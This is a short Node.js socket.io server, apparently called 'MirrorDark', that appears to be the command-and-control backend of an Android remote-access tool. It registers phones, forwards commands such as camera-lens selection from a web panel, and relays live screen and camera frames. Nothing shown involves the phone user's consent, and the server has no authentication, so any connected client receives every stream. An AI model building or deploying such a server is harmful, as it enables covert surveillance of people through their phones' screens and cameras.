const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let connectedDevices = new Map();

io.on('connection', (socket) => {
    console.log(`[+] Conexión establecida: ${socket.id}`);

    // Enviar lista actual al abrir el panel web
    socket.emit('update_devices', Array.from(connectedDevices.values()));

    socket.on('register_phone', (data) => {
        connectedDevices.set(socket.id, {
            id: socket.id,
            name: data.name || `Android Device (${socket.id.substring(0, 4)})`,
            ip: socket.handshake.address
        });
        console.log(`[📱] Celular registrado: ${socket.id}`);
        io.emit('update_devices', Array.from(connectedDevices.values()));
    });

    socket.on('send_command_to_device', (data) => {
        console.log(`[>] Enviando comando (${data.action}) al celular: ${data.targetId}`);
        io.to(data.targetId).emit('command_to_phone', { 
            action: data.action, 
            lens: data.lens || 'back' 
        });
    });

    socket.on('phone_response', (response) => {
        console.log(`[<] Respuesta recibida del celular: ${socket.id}`);
        // Mandamos la respuesta dirigida para que el panel sepa de qué celular vino
        io.emit('phone_response', { ...response, deviceId: socket.id });
    });

    // Transmisión de pantalla filtrada por ID de dispositivo
    socket.on('screen_frame', (base64Frame) => {
        io.emit('screen_frame', { deviceId: socket.id, frame: base64Frame });
    });

    // Transmisión de cámara filtrada por ID de dispositivo
    socket.on('camera_frame', (base64Frame) => {
        io.emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
    });

    socket.on('disconnect', () => {
        if (connectedDevices.has(socket.id)) {
            connectedDevices.delete(socket.id);
            console.log(`[-] Celular desconectado: ${socket.id}`);
            io.emit('update_devices', Array.from(connectedDevices.values()));
        } else {
            console.log(`[-] Panel web desconectado: ${socket.id}`);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor MirrorDark corriendo en el puerto ${PORT}`);
});